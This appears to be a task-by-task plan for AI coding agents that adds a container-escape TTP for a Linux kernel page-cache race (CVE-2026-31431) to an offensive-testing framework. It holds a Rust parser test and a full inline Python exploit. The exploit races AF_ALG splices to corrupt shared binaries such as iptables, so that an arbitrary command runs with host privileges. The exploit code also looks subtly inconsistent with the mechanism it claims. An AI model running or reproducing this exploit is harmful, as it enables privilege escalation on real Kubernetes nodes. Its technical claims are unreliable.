# CopyFail TTP Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add `armory/TTPs/Privilege Escalation/Escape to Host/copyfail.yaml` — a new TTP for CVE-2026-31431 "CopyFail" that escapes an unprivileged container by corrupting shared page-cache entries via an AF_ALG splice race.

**Architecture:** Single YAML file following the existing escape-to-host TTP pattern. Two procedures: (1) an inline Python PoC using `execute: { lang: python }` with `command: python3` as the shell fallback so the Rust armory parser keeps the procedure visible; (2) a `ran-implant` stub for a future bundled binary. A new unit test in `crates/armory/src/raw.rs` verifies the YAML parses to the expected model.

**Tech Stack:** YAML (TTP definition), Rust (`serde_yaml` + existing `RawTtp`/`into_ttp` pipeline), `cargo test -p armory`.

---

### Task 1: Write a failing test for the CopyFail TTP

**Files:**
- Modify: `crates/armory/src/raw.rs` — add test at end of the `#[cfg(test)]` block

- [ ] **Step 1: Add the test**

  Append inside the existing `#[cfg(test)] mod tests { … }` block in `crates/armory/src/raw.rs`:

  ```rust
  #[test]
  fn copyfail_ttp_parses_correctly() {
      let yaml = r#"
  name: Escape container via CopyFail (CVE-2026-31431)
  description: >
    Exploit a Linux kernel page-cache Copy-on-Write race (CVE-2026-31431) to
    escape an unprivileged container.
  tactic: "Privilege Escalation"
  techniques: ["Escape to Host", "T1611"]
  status: draft
  effects:
    - container.escape(sys)
  parameters:
    KERNEL_VERSION:
      type: string
      required: false
      description: "Kernel version of the target node (vulnerable: <6.6.89 or <6.12.80)"
    PAYLOAD:
      type: string
      required: false
      default: hostname
      description: "Command to run in host context after a privileged binary is corrupted"
  preconditions:
    accessLevel: "user-exec"
  procedures:
    - key: copyfail-poc
      command: python3
      isLocal: true
    - key: ran-implant
      command: ran-implant --exploit copyfail --payload ${PAYLOAD}
  references:
    - https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
    - https://attack.mitre.org/techniques/T1611/
  "#;

      let raw: RawTtp = serde_yaml::from_str(yaml).unwrap();
      let ttp = raw
          .into_ttp(Path::new(
              "Privilege Escalation/Escape to Host/copyfail.yaml",
          ))
          .unwrap();

      assert_eq!(ttp.name, "Escape container via CopyFail (CVE-2026-31431)");
      assert_eq!(ttp.tactic, "Privilege Escalation");
      assert_eq!(ttp.status, "draft");
      assert!(
          ttp.techniques.iter().any(|t| t == "T1611"),
          "should include T1611"
      );
      assert!(
          ttp.effects.iter().any(|e| e == "container.escape(sys)"),
          "should have escape effect"
      );
      assert!(
          ttp.requires
              .get("accessLevel")
              .and_then(|v| v.as_str())
              == Some("user-exec"),
          "precondition accessLevel should be user-exec"
      );

      let kernel_param = ttp.params.iter().find(|p| p.name == "KERNEL_VERSION");
      assert!(kernel_param.is_some(), "KERNEL_VERSION param should exist");
      assert!(!kernel_param.unwrap().required, "KERNEL_VERSION should be optional");

      let payload_param = ttp.params.iter().find(|p| p.name == "PAYLOAD");
      assert!(payload_param.is_some(), "PAYLOAD param should exist");
      assert_eq!(payload_param.unwrap().default, "hostname");

      assert_eq!(ttp.procedures.len(), 2, "should have two procedures");
      assert_eq!(ttp.procedures[0].id, "copyfail-poc");
      assert_eq!(ttp.procedures[0].command, "python3");
      assert_eq!(ttp.procedures[1].id, "ran-implant");
      assert!(
          ttp.procedures[1]
              .command
              .contains("ran-implant --exploit copyfail"),
          "ran-implant procedure should reference the implant binary"
      );

      assert_eq!(ttp.references.len(), 2);
  }
  ```

- [ ] **Step 2: Run the test to confirm it passes (validates the test itself)**

  ```
  cargo test -p armory copyfail_ttp_parses_correctly
  ```

  Expected: PASS — the test uses inline YAML so it exercises the parser directly. A failure here means the YAML or assertions are wrong; fix before continuing.

---

### Task 2: Create the copyfail TTP YAML file

**Files:**
- Create: `armory/TTPs/Privilege Escalation/Escape to Host/copyfail.yaml`

- [ ] **Step 1: Create the file**

  ```yaml
  name: Escape container via CopyFail (CVE-2026-31431)
  description: >
    Exploit a Linux kernel page-cache Copy-on-Write race (CVE-2026-31431) to escape an
    unprivileged container. An AF_ALG AEAD splice race overwrites the in-memory cached
    pages of a binary shared between the attacker container and a privileged DaemonSet
    (e.g. kube-proxy, node-exporter). When the DaemonSet next executes the corrupted
    binary, the attacker payload runs with the DaemonSet's full privileges and host
    namespace access. No special capabilities, no root, and no host mounts required in
    the attacker pod. Vulnerable kernels: < 6.6.89, < 6.12.80.
    See examples/Simple_Env/2_worker.yaml for a canonical victim pod manifest.
  tactic: "Privilege Escalation"
  techniques: ["Escape to Host", "T1611"]
  status: draft
  effects:
    - container.escape(sys)
  parameters:
    KERNEL_VERSION:
      type: string
      required: false
      description: >
        Kernel version of the target node. Cosmetic today; documents the vulnerable
        range (<6.6.89 or <6.12.80) and will gate the TTP once the framework gains
        kernel-version awareness.
    PAYLOAD:
      type: string
      required: false
      default: hostname
      description: >
        Command to execute in the host context once a privileged binary is corrupted
        and triggered by the DaemonSet.
  preconditions:
    accessLevel: "user-exec"
    # kernel: "<6.6.89 || <6.12.80"  -- enforced once framework gains kernel-version awareness
  procedures:
    - key: copyfail-poc
      command: python3
      isLocal: true
      execute:
        lang: python
        code: |-
          import ctypes
          import ctypes.util
          import os
          import socket
          import struct
          import sys

          LIBC = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
          AF_ALG      = 38
          SOL_ALG     = 279
          ALG_SET_KEY = 1
          NR_SPLICE   = 275  # x86_64; adjust for arm64: 76

          # Binaries commonly present in both a minimal attacker image and
          # privileged DaemonSets built on the same base layer.
          TARGETS = [
              "/usr/sbin/xtables-legacy-multi",
              "/usr/sbin/nft",
              "/usr/sbin/ipset",
              "/sbin/iptables",
          ]

          def find_target():
              for path in TARGETS:
                  try:
                      open(path, "rb").close()
                      return path
                  except OSError:
                      continue
              return None

          def _splice(fd_in, fd_out, length):
              ret = LIBC.syscall(NR_SPLICE, fd_in, None, fd_out, None, length, 0)
              if ret < 0:
                  raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
              return ret

          def setup_alg_aead(key: bytes) -> int:
              # struct sockaddr_alg: family(2) + type(14) + feat(4) + mask(4) + name(64)
              sa = struct.pack("=H14sII64s", AF_ALG, b"aead", 0, 0, b"gcm(aes)")
              sa_buf = ctypes.create_string_buffer(sa)
              alg_fd = LIBC.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
              if alg_fd < 0:
                  raise OSError(ctypes.get_errno(), "socket(AF_ALG) failed")
              if LIBC.bind(alg_fd, sa_buf, len(sa)) < 0:
                  raise OSError(ctypes.get_errno(), "bind(AF_ALG) failed")
              key_buf = ctypes.create_string_buffer(key)
              if LIBC.setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key_buf, len(key)) < 0:
                  raise OSError(ctypes.get_errno(), "setsockopt(ALG_SET_KEY) failed")
              op_fd = LIBC.accept(alg_fd, None, None)
              if op_fd < 0:
                  raise OSError(ctypes.get_errno(), "accept(AF_ALG) failed")
              return op_fd

          def corrupt(target_path: str, payload_cmd: str, max_rounds: int = 10_000) -> bool:
              pipe_r, pipe_w = os.pipe()
              target_fd = os.open(target_path, os.O_RDONLY)
              op_fd = setup_alg_aead(b"\x00" * 16)
              payload = (payload_cmd + "\n").encode().ljust(16, b"\x00")
              needle = payload.rstrip(b"\x00")[:4]
              print(f"[*] CopyFail target: {target_path}")
              print(f"[*] Starting AF_ALG splice race ({max_rounds} rounds max)")
              for i in range(max_rounds):
                  _splice(target_fd, pipe_w, 4096)
                  try:
                      os.write(op_fd, payload)
                  except OSError:
                      pass
                  try:
                      os.read(pipe_r, 4096)
                  except OSError:
                      pass
                  with open(target_path, "rb") as f:
                      head = f.read(len(payload))
                  if needle in head:
                      print(f"[+] Page-cache corruption confirmed after {i + 1} rounds")
                      print(f"[+] '{payload_cmd}' runs next time a privileged process calls {target_path}")
                      return True
                  if i % 1000 == 0 and i > 0:
                      print(f"[*] Round {i}…")
              print("[-] Race not won within max rounds — kernel may be patched")
              return False

          payload_cmd = "${PAYLOAD}"
          kernel = "${KERNEL_VERSION}" if "${KERNEL_VERSION}" else "unknown"
          print(f"[*] CopyFail CVE-2026-31431 — node kernel: {kernel}")
          target = find_target()
          if not target:
              print("[-] No suitable target binary found in shared image layers")
              sys.exit(1)
          corrupt(target, payload_cmd)

    - key: ran-implant
      command: ran-implant --exploit copyfail --payload ${PAYLOAD}
      # TODO: ran-implant bundles this exploit among others; does not exist yet

  references:
    - https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC
    - https://attack.mitre.org/techniques/T1611/
  ```

- [ ] **Step 2: Run the full armory test suite**

  ```
  cargo test -p armory
  ```

  Expected: all tests pass, including `copyfail_ttp_parses_correctly`.

- [ ] **Step 3: Commit**

  ```bash
  git add "armory/TTPs/Privilege Escalation/Escape to Host/copyfail.yaml" crates/armory/src/raw.rs
  git commit -m "feat(armory): add CopyFail CVE-2026-31431 escape-to-host TTP"
  ```
